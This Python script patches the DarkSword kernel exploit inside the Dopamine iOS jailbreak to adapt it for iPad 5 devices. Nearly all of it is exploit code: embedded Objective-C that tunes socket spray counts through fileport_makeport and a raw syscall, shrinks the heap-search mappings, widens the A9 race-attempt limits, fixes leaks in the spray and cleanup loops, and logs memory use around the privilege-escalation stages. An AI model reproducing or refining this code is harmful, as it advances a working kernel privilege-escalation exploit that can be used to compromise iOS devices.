#!/usr/bin/env python3
"""Apply the experimental iPad 5 (iPad6,11/iPad6,12) DarkSword profile.

This patch is intentionally isolated to the research/ipad5-darksword branch.
It fixes repeat-pass resource leaks, adds a lower-memory heap search profile,
cycles socket spray sizes, extends the A9 race window, and writes a persistent
DarkSword-iPad5.log inside Dopamine's Documents directory.
"""

from pathlib import Path

TARGET = Path("Application/Dopamine/Exploits/DarkSword/DarkSword.m")


def replace_once(text: str, old: str, new: str, label: str) -> str:
    count = text.count(old)
    if count != 1:
        raise RuntimeError(f"{label}: expected exactly one match, found {count}")
    return text.replace(old, new, 1)


def main() -> None:
    text = TARGET.read_text(encoding="utf-8")

    text = replace_once(
        text,
        "#include <mach/mach.h>\n",
        "#include <mach/mach.h>\n#include <mach/task_info.h>\n",
        "task-info include",
    )

    text = replace_once(
        text,
        "bool isArm64e = false;\n",
        "bool isArm64e = false;\n"
        "bool isIPad5Device = false;\n"
        "static unsigned gIPad5Pass = 0;\n",
        "iPad 5 globals",
    )

    log_helpers = r'''
static void ipad5_log_memory(const char *stage)
{
    if (!isIPad5Device) return;

    mach_task_basic_info_data_t info = {0};
    mach_msg_type_number_t count = MACH_TASK_BASIC_INFO_COUNT;
    kern_return_t kr = task_info(mach_task_self(),
                                 MACH_TASK_BASIC_INFO,
                                 (task_info_t)&info,
                                 &count);
    if (kr == KERN_SUCCESS) {
        printf("[iPad5] %s: resident=%llu MB virtual=%llu MB pass=%u\n",
               stage,
               (unsigned long long)(info.resident_size / (1024ULL * 1024ULL)),
               (unsigned long long)(info.virtual_size / (1024ULL * 1024ULL)),
               gIPad5Pass);
    } else {
        printf("[iPad5] %s: task_info failed: %s\n", stage, mach_error_string(kr));
    }
    fflush(stdout);
}

static void ipad5_enable_persistent_log(void)
{
    NSString *documents = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                               NSUserDomainMask,
                                                               YES).firstObject;
    if (!documents) return;

    NSString *logPath = [documents stringByAppendingPathComponent:@"DarkSword-iPad5.log"];
    FILE *logFile = freopen(logPath.fileSystemRepresentation, "a+", stdout);
    if (logFile) {
        setvbuf(stdout, NULL, _IONBF, 0);
        dup2(fileno(stdout), STDERR_FILENO);
    }

    printf("\n========== iPad 5 DarkSword session %s ==========\n",
           [NSDate date].description.UTF8String);
    printf("[iPad5] persistent log: %s\n", logPath.fileSystemRepresentation);
    fflush(stdout);
}

'''
    text = replace_once(
        text,
        "pthread_t freeThread;\n",
        log_helpers + "pthread_t freeThread;\n",
        "persistent logging helpers",
    )

    old_spray = r'''    fileport_t outputSocketPort = 0;
    fileport_makeport(fd, &outputSocketPort);
    close(fd);

    void *socketInfo = calloc(1, 0x400);
    int r = syscall(336, 6, getpid(), 3, outputSocketPort, socketInfo, 0x400);
    uint64_t inp_gencnt = *(uint64_t *)((uintptr_t)socketInfo + 0x110);

    [socketPorts addObject:@(outputSocketPort)];
    [socketPcbIds addObject:@(inp_gencnt)];
    return outputSocketPort;
'''
    new_spray = r'''    fileport_t outputSocketPort = 0;
    kern_return_t fpkr = fileport_makeport(fd, &outputSocketPort);
    close(fd);
    if (fpkr != KERN_SUCCESS || outputSocketPort == MACH_PORT_NULL) {
        printf("[-] fileport_makeport failed: %s\n", mach_error_string(fpkr));
        return -1;
    }

    void *socketInfo = calloc(1, 0x400);
    if (!socketInfo) {
        mach_port_deallocate(mach_task_self(), outputSocketPort);
        return -1;
    }

    int r = syscall(336, 6, getpid(), 3, outputSocketPort, socketInfo, 0x400);
    if (r != 0) {
        printf("[-] socket info syscall failed: %d\n", r);
        free(socketInfo);
        mach_port_deallocate(mach_task_self(), outputSocketPort);
        return -1;
    }

    uint64_t inp_gencnt = *(uint64_t *)((uintptr_t)socketInfo + 0x110);
    free(socketInfo); // Important on 2 GB devices: this ran thousands of times per pass.

    [socketPorts addObject:@(outputSocketPort)];
    [socketPcbIds addObject:@(inp_gencnt)];
    return outputSocketPort;
'''
    text = replace_once(text, old_spray, new_spray, "socket spray leak fix")

    text = replace_once(
        text,
        "    for (int tryIdx = 0; tryIdx < highestSuccessIdx + 100; tryIdx++) {\n",
        "    int tryLimit = highestSuccessIdx + (isIPad5Device ? 220 : 100);\n"
        "    if (isIPad5Device && tryLimit < 420) tryLimit = 420;\n"
        "    for (int tryIdx = 0; tryIdx < tryLimit; tryIdx++) {\n",
        "A9 race attempt floor",
    )

    text = replace_once(
        text,
        "        if (tryIdx == 500) {\n",
        "        if (tryIdx == (isIPad5Device ? 900 : 500)) {\n",
        "A9 race hard cap",
    )

    old_geometry = r'''    uint64_t totalSearchMappingPagesNum = isA18Device ? (0x10 * 0x10) : (0x1000 * 0x10);
    uint64_t searchMappingSize = isA18Device ? (0x10 * PAGE_SIZE) : (0x2000 * PAGE_SIZE);
    uint64_t totalSearchMappingSize = totalSearchMappingPagesNum * PAGE_SIZE;
'''
    new_geometry = r'''    uint64_t totalSearchMappingPagesNum = isA18Device ? (0x10 * 0x10) : (0x1000 * 0x10);
    uint64_t searchMappingSize = isA18Device ? (0x10 * PAGE_SIZE) : (0x2000 * PAGE_SIZE);

    // The stock non-A18 profile maps roughly 1 GB on 16 KB-page devices.
    // iPad 5 only has 2 GB RAM, so use eight 48 MB windows (384 MB total).
    if (isIPad5Device) {
        totalSearchMappingPagesNum = 0x6000;
        searchMappingSize = 0xC00 * PAGE_SIZE;
    }

    uint64_t totalSearchMappingSize = totalSearchMappingPagesNum * PAGE_SIZE;
'''
    text = replace_once(text, old_geometry, new_geometry, "low-memory search geometry")

    text = replace_once(
        text,
        "    NSMutableArray *targetInpGencntList = [NSMutableArray new];\n    while (true) {\n",
        "    NSMutableArray *targetInpGencntList = [NSMutableArray new];\n"
        "    while (true) {\n"
        "        if (isIPad5Device) {\n"
        "            gIPad5Pass++;\n"
        "            printf(\"[iPad5] starting heap-layout pass %u\\n\", gIPad5Pass);\n"
        "            ipad5_log_memory(\"pass-start\");\n"
        "        }\n",
        "pass diagnostics",
    )

    old_socket_loop = r'''        #define OPEN_MAX 10240
        int maxfiles = OPEN_MAX * 3;
        int leeway = 4096 * 2;
        for (unsigned socketCount = 0; socketCount < (maxfiles - leeway); socketCount++) {
'''
    new_socket_loop = r'''        #define OPEN_MAX 10240
        int maxfiles = OPEN_MAX * 3;
        int leeway = 4096 * 2;
        unsigned socketTarget = (unsigned)(maxfiles - leeway);
        if (isIPad5Device) {
            // Rotate layouts instead of allocating the stock 22,528 sockets every pass.
            static const unsigned targets[] = { 8192, 10240, 12288 };
            socketTarget = targets[(gIPad5Pass - 1) % (sizeof(targets) / sizeof(targets[0]))];
            printf("[iPad5] socket spray target: %u\n", socketTarget);
        }
        for (unsigned socketCount = 0; socketCount < socketTarget; socketCount++) {
'''
    text = replace_once(text, old_socket_loop, new_socket_loop, "adaptive socket spray")

    old_cleanup = r'''        for (uint64_t s = 0; s < searchMappingNum; s++) {
            mach_vm_address_t searchMappingAddress = searchMappings.lastObject.unsignedLongLongValue;
            [searchMappings removeLastObject];
            kr = mach_vm_deallocate(mach_task_self(), searchMappingAddress, searchMappingSize);
'''
    new_cleanup = r'''        for (uint64_t s = 0; s < searchMappingNum; s++) {
            mach_vm_address_t searchMappingAddress = searchMappings.lastObject.unsignedLongLongValue;
            [searchMappings removeLastObject];

            // surface_mlock stores a retained IOSurface in gMlockDict. The original
            // loop deallocated the VM range but never released that IOSurface,
            // causing every failed pass to retain hundreds of MB on 2 GB devices.
            surface_munlock(searchMappingAddress, searchMappingSize);
            kr = mach_vm_deallocate(mach_task_self(), searchMappingAddress, searchMappingSize);
'''
    text = replace_once(text, old_cleanup, new_cleanup, "IOSurface unpin cleanup")

    old_detect = r'''    isA18Device = (bool)strstr(name.machine, "iPhone17,");

    if (isA18Device) {
'''
    new_detect = r'''    isIPad5Device = (bool)(strstr(name.machine, "iPad6,11") ||
                                strstr(name.machine, "iPad6,12"));
    if (isIPad5Device) {
        ipad5_enable_persistent_log();
        printf("[iPad5] detected model: %s\n", name.machine);
        printf("[iPad5] experimental low-memory DarkSword profile enabled\n");
        ipad5_log_memory("exploit-init");
    }

    isA18Device = (bool)strstr(name.machine, "iPhone17,");

    if (isA18Device) {
'''
    text = replace_once(text, old_detect, new_detect, "iPad 5 device detection")

    text = replace_once(
        text,
        "        pe_init();\n        pe_v1();\n",
        "        pe_init();\n"
        "        if (isIPad5Device) ipad5_log_memory(\"before-pe-v1\");\n"
        "        pe_v1();\n"
        "        if (isIPad5Device) ipad5_log_memory(\"pe-v1-success\");\n",
        "exploit stage diagnostics",
    )

    TARGET.write_text(text, encoding="utf-8")
    print(f"Patched {TARGET} for iPad 5 DarkSword diagnostics")


if __name__ == "__main__":
    main()
